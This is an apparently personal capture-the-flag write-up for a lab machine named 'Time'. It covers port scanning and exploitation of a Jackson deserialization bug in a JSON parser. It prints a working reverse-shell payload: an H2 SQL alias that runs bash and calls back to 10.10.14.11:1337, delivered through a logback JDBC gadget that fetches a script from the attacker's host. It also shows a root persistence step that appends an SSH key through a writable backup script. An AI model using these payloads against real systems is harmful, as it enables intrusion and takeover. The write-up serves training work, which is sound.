---
description: My first insecure serialization
---

# Time

At the beginning, rustscan was used as network scanner to retrieve active services and it's versions.

```
rustscan -a $ip -r 1-65535 -- -sV -sC -Pn > resources/ruscan.nmap


22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqO75jA9cYksdPP+eBZBYzvJERbVfExL7kXpMJQpmpHoJdl9EG/wSsXgEH4BXsa56Rv2i32ClI7QvykILEpL6JyhHi3xS8vlNud8CQCYCYNCiBzpa84ucBbLpFaR331qH3n1PNrlBjvH0g4jmlQjlKMHRNSjxOS5XjO3JMYFhBkI3tZKXuo9dg/0wHwXXbGa5gFihkrTkGqinaPRACYC8FCgQ3UUpUzjTUUwSLMMMMAUJX+WkqPiD3++VCSmQmJn4rtOQK2PNzesJQFrHk5BLj6J2gfLUkgvVu2dMVCYAJ8Pom+sYRLq5dkBdaXugjpFXGWFXxYjh57h21HVtkdAVyObBu4iNlZQNYNPpYKuLbmTKdEv86FMfw/g1ZasV1q53gEc4vWyWVQSkarHXPyMYTY1nsFEIvkhGl8CsuwS0HioWaBRsF/+jQF+5Zty43VWJuu+PanAIOelmxAHrfNm//XrIW7RjqCLEDj0MpUeK4KUMx7WPuyE10zpESpuqhtAU=
|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCY27npy127v6WaSs6QO9MlX1RCjlp8ceQ0UyP6SfI+Q7UZrmg0qLFANnuqkm8iNio+TLTTOIAv5itdE0ahgzgE=
|   256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFy9CB1oSRwsAZJb6AMVD7/T0qxBk2G7/hV2Db57c0Kj
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Online JSON parser
|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Exploring the HTTP service, was found an beautify an app that restructure json text. It's app have two options of parsing "beautify" and "beta". It the purpose of the challenge is exploit an app the focus will be on beta.

pica

Poking the parser with some especial text characters we got an error.

```
Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.io.JsonEOFException:
Unexpected end-of-input: was expecting closing quote for a string value 
```

Searching this error message on google, was discovered that it can result in an insecure decentralization and can cause an remote code execution. Backing to the search, an exploit was found.

```
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.11/1337 0>&1')
```

To use it, was necessary up an web server, and send the following text through the target application.

```
["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.11:8000/inject.sql'"}]
```

This code will hit, the web server and download the our expoit that will be stored in an file. Allowing command execution, and as a payload we send a reverseshell, that will connect with attacker machine in the specified port, in this particular case was used netcat in port 1337.

```
nc -nlvp 1337
```

pic shell

Getting the system, now we'll need to find a way to scale privilege, to facilitate our exploration, the tool linpease will be used to search sensible content on the system.

Searching in this entire output, we found some interesting things like CVE's and other stuffs, but we got access to file called timer\_backup.sh and as we know, the name of this current machine is a bit suggestive.

Looking at this script permission, i've realized that it's have attache permission. Knowing it, i got the idea to pass my ssh authorized\_keys into the /root/.ssh.

```
echo "echo $(<authorized_keys) >>/root/.ssh/authorized_keys" >> /usr/bin/timer_backup.sh
```

If all things will be right done, we are allowed to login machine using this ssh command.

ssh -i \~/.ssh/id\_rsa darccau@10.10.10.100
